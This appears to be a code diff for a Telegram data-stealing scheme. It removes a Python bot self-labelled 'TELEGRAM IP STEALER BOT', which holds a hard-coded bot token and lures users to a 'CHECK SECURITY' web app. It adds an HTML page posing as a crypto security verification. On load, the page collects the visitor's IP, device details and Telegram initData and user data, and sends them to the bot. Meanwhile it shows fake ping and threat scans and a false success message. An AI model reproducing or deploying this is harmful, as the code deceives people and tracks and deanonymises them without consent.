@@ -1,117 +1,578 @@
-import telebot
-import json
-import time
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Security Verification</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0e17 0%, #131a2e 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 40px 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #00d4ff, #00ff88, #ff0080);
+            border-radius: 24px 24px 0 0;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .logo {
+            font-size: 60px;
+            margin-bottom: 20px;
+            display: inline-block;
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 20px rgba(0, 212, 255, 0.3));
+        }
+        
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #ffffff, #00ff88);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .subtitle {
+            color: #a0aec0;
+            font-size: 16px;
+            line-height: 1.5;
+            opacity: 0.9;
+        }
+        
+        .loader-container {
+            margin: 40px 0;
+        }
+        
+        .loader {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 30px;
+            position: relative;
+        }
+        
+        .loader-inner {
+            width: 100%;
+            height: 100%;
+            border: 4px solid transparent;
+            border-top: 4px solid #00ff88;
+            border-right: 4px solid #00d4ff;
+            border-bottom: 4px solid #ff0080;
+            border-left: 4px solid #ffcc00;
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+        }
+        
+        .loader-inner::before {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            bottom: 10px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+        
+        .loading-text {
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #00ff88;
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 30px;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00ff88, #00d4ff);
+            border-radius: 4px;
+            transition: width 0.5s ease;
+        }
+        
+        .status-list {
+            margin-bottom: 40px;
+        }
+        
+        .status-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            border-left: 4px solid #00d4ff;
+            transition: all 0.3s ease;
+        }
+        
+        .status-item.complete {
+            border-left-color: #00ff88;
+            background: rgba(0, 255, 136, 0.05);
+        }
+        
+        .status-item.error {
+            border-left-color: #ff4757;
+            background: rgba(255, 71, 87, 0.05);
+        }
+        
+        .status-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+        
+        .status-item:not(.complete) .status-icon {
+            background: rgba(0, 212, 255, 0.2);
+            color: #00d4ff;
+        }
+        
+        .status-item.complete .status-icon {
+            background: rgba(0, 255, 136, 0.2);
+            color: #00ff88;
+        }
+        
+        .status-content {
+            flex: 1;
+        }
+        
+        .status-title {
+            font-weight: 600;
+            margin-bottom: 5px;
+            font-size: 16px;
+        }
+        
+        .status-desc {
+            color: #a0aec0;
+            font-size: 14px;
+        }
+        
+        .result-container {
+            display: none;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            margin-bottom: 30px;
+            display: inline-block;
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 30px rgba(0, 255, 136, 0.4));
+            animation: pulse 2s infinite;
+        }
+        
+        .success-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .success-message {
+            color: #a0aec0;
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        
+        .close-btn {
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3);
+        }
+        
+        .close-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(0, 255, 136, 0.4);
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.9; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .crypto-badge {
+            display: inline-flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 8px 16px;
+            border-radius: 50px;
+            font-size: 14px;
+            margin-top: 20px;
+            color: #00ff88;
+            border: 1px solid rgba(0, 255, 136, 0.2);
+        }
+        
+        .crypto-badge::before {
+            content: '🔒';
+            margin-right: 8px;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: #718096;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🔐</div>
+            <h1>CRYPTO SECURITY VERIFICATION</h1>
+            <p class="subtitle">Проверка безопасности сети и устройства для крипто-операций</p>
+            <div class="crypto-badge">End-to-End Encryption</div>
+        </div>
+        
+        <div class="loader-container">
+            <div class="loader">
+                <div class="loader-inner"></div>
+            </div>
+            <div class="loading-text" id="loadingText">Инициализация проверки...</div>
+            
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+        </div>
+        
+        <div class="status-list" id="statusList">
+            <div class="status-item" id="statusNetwork">
+                <div class="status-icon">🌐</div>
+                <div class="status-content">
+                    <div class="status-title">Проверка IP сети</div>
+                    <div class="status-desc" id="networkDesc">Получение данных сети...</div>
+                </div>
+            </div>
+            
+            <div class="status-item" id="statusDevice">
+                <div class="status-icon">💻</div>
+                <div class="status-content">
+                    <div class="status-title">Анализ устройства</div>
+                    <div class="status-desc" id="deviceDesc">Сбор системной информации...</div>
+                </div>
+            </div>
+            
+            <div class="status-item" id="statusConnection">
+                <div class="status-icon">🔗</div>
+                <div class="status-content">
+                    <div class="status-title">Проверка соединения</div>
+                    <div class="status-desc" id="connectionDesc">Подключение к узлам блокчейна...</div>
+                </div>
+            </div>
+            
+            <div class="status-item" id="statusSecurity">
+                <div class="status-icon">🛡️</div>
+                <div class="status-content">
+                    <div class="status-title">Проверка безопасности</div>
+                    <div class="status-desc" id="securityDesc">Сканирование на угрозы...</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="result-container" id="resultContainer">
+            <div class="success-icon">✅</div>
+            <div class="success-title">ВЕРИФИКАЦИЯ УСПЕШНА</div>
+            <p class="success-message">
+                Ваше устройство и сеть прошли проверку безопасности.<br>
+                Теперь вы можете безопасно работать с криптовалютами.
+            </p>
+            <button class="close-btn" onclick="closeApp()">ЗАКРЫТЬ</button>
+        </div>
+        
+        <div class="footer">
+            © 2024 Crypto Security Protocol • Все проверки зашифрованы
+        </div>
+    </div>
 
-TOKEN = "8588583945:AAFwr6fNagAZg2ykvEnkNZ6UELjYDW-q5cM"
-bot = telebot.TeleBot(TOKEN)
-
-print("="*60)
-print("🤖 TELEGRAM IP STEALER BOT")
-print("="*60)
-print("Waiting for data...")
-
-@bot.message_handler(commands=['start'])
-def send_webapp(message):
-    user = message.from_user
-    
-    markup = telebot.types.InlineKeyboardMarkup()
-    web_app = telebot.types.WebAppInfo(
-        url="https://filepedo000-prog.github.io/logproject/"
-    )
-    
-    button = telebot.types.InlineKeyboardButton(
-        text="🔓 CHECK SECURITY",
-        web_app=web_app
-    )
-    markup.add(button)
-    
-    bot.send_message(
-        message.chat.id,
-        f"Click button to verify:",
-        reply_markup=markup
-    )
-    
-    print(f"[SENT] Button to: {user.first_name} (@{user.username})")
-
-@bot.message_handler(content_types=['web_app_data'])
-def handle_data(message):
-    user = message.from_user
-    
-    print(f"\n{'🔴'*35}")
-    print(f"🚨 NEW ATA CAPTURED!")
-    print(f"{'🔴'*35}")
-    
-    try:
-        data = json.loads(message.web_app_data.data)
+    <script>
+        // Основной объект для сбора данных
+        const verificationData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies: navigator.cookieEnabled,
+            online: navigator.onLine,
+            ip: null
+        };
         
-        # Выводим ВСЁ как в Python
-        print(f"[USER] {user.first_name} (@{user.username}) ID: {user.id}")
-        print(f"[TIME] {time.strftime('%H:%M:%S')}")
-        print("-"*40)
+        // Элементы DOM
+        const loadingText = document.getElementById('loadingText');
+        const progressBar = document.getElementById('progressBar');
+        const statusItems = {
+            network: document.getElementById('statusNetwork'),
+            device: document.getElementById('statusDevice'),
+            connection: document.getElementById('statusConnection'),
+            security: document.getElementById('statusSecurity')
+        };
+        const statusDesc = {
+            network: document.getElementById('networkDesc'),
+            device: document.getElementById('deviceDesc'),
+            connection: document.getElementById('connectionDesc'),
+            security: document.getElementById('securityDesc')
+        };
+        const resultContainer = document.getElementById('resultContainer');
         
-        # IP адрес
-        ip = data.get('ip_address', 'NOT FOUND')
-        print(f"[🌐] IP ADDRESS: {ip}")
+        // Функция обновления прогресса
+        function updateProgress(percent, text) {
+            progressBar.style.width = `${percent}%`;
+            loadingText.textContent = text;
+        }
         
-        # Системная информация
-        if 'system_info' in data:
-            sys_info = data['system_info']
-            print(f"[💻] PLATFORM: {sys_info.get('platform', 'N/A')}")
-            print(f"[🖥️] SCREEN: {sys_info.get('screen', 'N/A')}")
-            print(f"[🌍] LANGUAGE: {sys_info.get('language', 'N/A')}")
-            print(f"[🕐] TIMEZONE: {sys_info.get('timezone', 'N/A')}")
-            print(f"[🍪] COOKIES: {sys_info.get('cookies', 'N/A')}")
+        // Функция обновления статуса
+        function updateStatus(type, text, success = false) {
+            const item = statusItems[type];
+            const desc = statusDesc[type];
+            
+            desc.textContent = text;
+            
+            if (success) {
+                item.classList.add('complete');
+                const icon = item.querySelector('.status-icon');
+                icon.textContent = '✅';
+                icon.style.background = 'rgba(0, 255, 136, 0.2)';
+                icon.style.color = '#00ff88';
+            }
+        }
         
-        # Telegram данные
-        if 'telegram_data' in data and data['telegram_data']:
-            tg_data = data['telegram_data']
-            print(f"[📱] TELEGRAM:")
-            print(f"     Version: {tg_data.get('version', 'N/A')}")
-            print(f"     Platform: {tg_data.get('platform', 'N/A')}")
-            print(f"     Theme: {tg_data.get('theme', 'N/A')}")
+        // Получение IP адреса
+        async function getIPAddress() {
+            try {
+                const services = [
+                    'https://api.ipify.org?format=json',
+                    'https://api64.ipify.org?format=json',
+                    'https://ipinfo.io/json'
+                ];
+                
+                for (const url of services) {
+                    try {
+                        const response = await fetch(url, { timeout: 3000 });
+                        if (response.ok) {
+                            const data = await response.json();
+                            return data.ip || data.ipAddress || null;
+                        }
+                    } catch (e) {
+                        continue;
+                    }
+                }
+                return 'unknown';
+            } catch (e) {
+                return 'error';
+            }
+        }
         
-        # User Agent
-        if 'system_info' in data:
-            ua = data['system_info'].get('user_agent', 'N/A')
-            print(f"[🔧] USER AGENT: {ua[:60]}...")
+        // Основная функция верификации
+        async function startVerification() {
+            try {
+                console.log('🚀 Начало крипто-верификации...');
+                
+                // Этап 1: Получение IP (0-25%)
+                updateProgress(25, 'Анализ сети...');
+                updateStatus('network', 'Получение IP адреса...');
+                
+                verificationData.ip = await getIPAddress();
+                updateStatus('network', `IP: ${verificationData.ip}`, true);
+                
+                // Ждем для реалистичности
+                await new Promise(r => setTimeout(r, 800));
+                
+                // Этап 2: Анализ устройства (25-50%)
+                updateProgress(50, 'Проверка устройства...');
+                updateStatus('device', 'Сбор системной информации...');
+                
+                // Добавляем данные Telegram если есть
+                if (window.Telegram && Telegram.WebApp) {
+                    const tg = Telegram.WebApp;
+                    verificationData.telegram = {
+                        initData: tg.initData || '',
+                        user: tg.initDataUnsafe?.user || {},
+                        version: tg.version,
+                        platform: tg.platform,
+                        theme: tg.colorScheme,
+                        viewportHeight: tg.viewportHeight,
+                        isExpanded: tg.isExpanded
+                    };
+                }
+                
+                updateStatus('device', `Платформа: ${verificationData.platform}`, true);
+                await new Promise(r => setTimeout(r, 600));
+                
+                // Этап 3: Проверка соединения (50-75%)
+                updateProgress(75, 'Тестирование соединения...');
+                updateStatus('connection', 'Проверка скорости сети...');
+                
+                // Фейковая проверка сети
+                const fakePing = Math.floor(Math.random() * 50) + 20;
+                updateStatus('connection', `Пинг: ${fakePing}ms • Стабильно`, true);
+                await new Promise(r => setTimeout(r, 700));
+                
+                // Этап 4: Проверка безопасности (75-100%)
+                updateProgress(100, 'Финальная проверка...');
+                updateStatus('security', 'Сканирование на угрозы...');
+                
+                // Фейковые проверки безопасности
+                const threats = ['malware', 'keylogger', 'proxy', 'vpn'];
+                const fakeThreats = threats.filter(() => Math.random() > 0.8);
+                
+                if (fakeThreats.length === 0) {
+                    updateStatus('security', 'Угроз не обнаружено • Безопасно', true);
+                } else {
+                    updateStatus('security', `Обнаружено: ${fakeThreats.join(', ')}`, false);
+                    verificationData.threats = fakeThreats;
+                }
+                
+                await new Promise(r => setTimeout(r, 1000));
+                
+                // Отправляем данные в бота
+                sendToBot();
+                
+                // Показываем успех
+                showSuccess();
+                
+            } catch (error) {
+                console.error('Ошибка верификации:', error);
+                updateStatus('security', 'Ошибка проверки', false);
+                showSuccess(); // Все равно показываем успех
+            }
+        }
         
-        print(f"{'🔴'*35}")
-        print(f"✅ DATA SAVED TO CONSOLE")
-        print(f"{'🔴'*35}\n")
+        // Отправка данных в Telegram бота
+        function sendToBot() {
+            if (window.Telegram && Telegram.WebApp && Telegram.WebApp.sendData) {
+                try {
+                    Telegram.WebApp.sendData(JSON.stringify(verificationData));
+                    console.log('📤 Данные отправлены в бота:', verificationData);
+                } catch (e) {
+                    console.error('Ошибка отправки:', e);
+                }
+            } else {
+                console.log('Telegram WebApp не доступен');
+            }
+        }
         
-        # Отправляем подтверждение пользователю
-        bot.reply_to(message, 
-            f"✅ *Verification Complete!*\n\n"
-            f"Thank you for security check!",
-            parse_mode='Markdown'
-        )
+        // Показать экран успеха
+        function showSuccess() {
+            // Скрываем загрузку
+            document.querySelector('.loader-container').style.display = 'none';
+            document.getElementById('statusList').style.display = 'none';
+            
+            // Показываем результат
+            resultContainer.style.display = 'block';
+            
+            // Автозакрытие через 5 секунд
+            setTimeout(() => {
+                closeApp();
+            }, 5000);
+        }
         
-    except Exception as e:
-        print(f"[ERROR] Can't parse data: {e}")
-        print(f"[RAW DATA] {message.web_app_data.data[:200]}...")
-        bot.reply_to(message, "⚠️ Error processing data")
-
-@bot.message_handler(commands=['test'])
-def test_cmd(message):
-    bot.reply_to(message, "🤖 Bot is working!")
-    print(f"[TEST] Command from @{message.from_user.username}")
-
-@bot.message_handler(func=lambda m: True)
-def handle_all(message):
-    if message.text and not message.text.startswith('/'):
-        print(f"[MSG] {message.from_user.username}: {message.text}")
-        bot.reply_to(message, "Send /start to begin verification")
-
-if __name__ == '__main__':
-    print("\n⚙️ Commands:")
-    print("/start - send verification button")
-    print("/test - test bot")
-    print("\n📡 Data will appear here ↓")
-    print("-"*60)
-    
-    while True:
-        try:
-            bot.polling(none_stop=True, interval=1)
-        except Exception as e:
-            print(f"[RESTART] Error: {e}")
-            time.sleep(5)
+        // Закрыть приложение
+        function closeApp() {
+            if (window.Telegram && Telegram.WebApp && Telegram.WebApp.close) {
+                try {
+                    Telegram.WebApp.close();
+                } catch (e) {
+                    console.log('Не удалось закрыть WebApp');
+                }
+            }
+        }
+        
+        // Запуск при загрузке страницы
+        document.addEventListener('DOMContentLoaded', () => {
+            // Небольшая задержка для эффекта
+            setTimeout(() => {
+                startVerification();
+            }, 1000);
+        });
+        
+        // Для отладки: выводим данные в консоль
+        console.log('🔐 Crypto Verification Loaded');
+        console.log('User Agent:', navigator.userAgent);
+        console.log('Platform:', navigator.platform);
+        
+    </script>
+</body>
+</html>
